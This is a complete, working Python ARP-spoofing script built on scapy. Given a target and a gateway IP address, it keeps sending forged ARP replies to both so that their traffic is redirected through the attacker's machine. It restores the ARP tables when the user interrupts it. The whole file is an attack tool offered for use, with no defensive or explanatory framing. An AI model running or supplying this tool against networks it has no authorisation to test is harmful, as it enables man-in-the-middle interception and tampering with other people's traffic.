#!/usr/bin/env python

"""
Ver: Python3

this program acts as ARP spoofer
format for calling the program:
sudo python3 main.py -t TARGET_IP_ADDRESS -g GATEWAY_IP_ADDRESS

-t --target: target machine IP address
-g --gateway: gateway IP address
"""

import scapy.all as scapy
import time
import optparse
import sys

def get_arguments():
    """
    Get user arguments which were passed with app call

    :return: target ip and gateway ip address
    """
    # create parser object
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target_ip", help=" Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help=" Gateway IP address")

    # parsing of user input
    (options, arguments) = parser.parse_args()

    if not options.target_ip:
        # error handler
        parser.error([" Specify the target IP address "])
    elif not options.gateway_ip:
        # error handler
        parser.error([" Specify the gateway IP address "])
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list[0][1].hwsrc != None:
        return answered_list[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    """ ARP spoofing """
    print(f"target IP: {target_ip}")
    try:
        target_mac = get_mac(target_ip)
        # create ARP packet; op=2 -> ARP response; pdst, hwdst -> target(victim) machine;
        # psrc (ip addr which the script pretends to be) -> router ip
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except:
        print(" Wrong mac address ")


def restore(dest_ip, source_ip):
    """ Restore from ARP spoofing"""
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbose=False)


#target_ip = "192.168.1.165"
#gateway_ip = "192.168.1.1"

# get arguments from app call command (target IP , gateway IP)
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

restore(target_ip, gateway_ip)

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print(f" \r Packets sent: {sent_packet_count}  ", end='')
        sent_packet_count += 2
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(" \n Detected CTRL+C .... Reset ARP table")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
